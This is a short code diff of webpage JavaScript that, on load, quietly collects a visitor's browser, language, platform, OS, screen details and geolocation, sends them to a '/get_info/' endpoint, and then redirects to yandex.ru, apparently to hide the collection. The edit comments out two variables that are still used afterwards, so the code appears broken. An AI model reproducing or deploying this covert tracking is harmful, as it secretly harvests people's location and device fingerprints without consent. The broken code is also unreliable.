@@ -35,8 +35,8 @@ var rqst = getXmlHttp();
 
 	window.onload = function catchfnc() {
 		var s = window.screen;
-		var brser = navigator.appName;
-		var lng = navigator.language;
+		//var brser = navigator.appName;
+		//var lng = navigator.language;
 		var ops = navigator.platform;
 		var bbrser = BrowserDetect.browser;
 		var bos = BrowserDetect.OS;
@@ -62,11 +62,7 @@ var rqst = getXmlHttp();
 				var addr = "/get_info/"+brser+"/"+lng+"/"+ops+"/"+bbrser+"/"+bos+"/"+height+"/"+width+"/"+colors+"/"+lat+"/"+long+"/"+rad;
 				rqst.open("GET", addr, true)
 				rqst.send();
-				rqst.onreadystatechange = function() {
-					if (rqst.readyState == 3 || rqst.readyState == 4) {
-						window.location = "http://yandex.ru";
-					}
-				}
+				
 
 				
 				window.location = "http://yandex.ru";
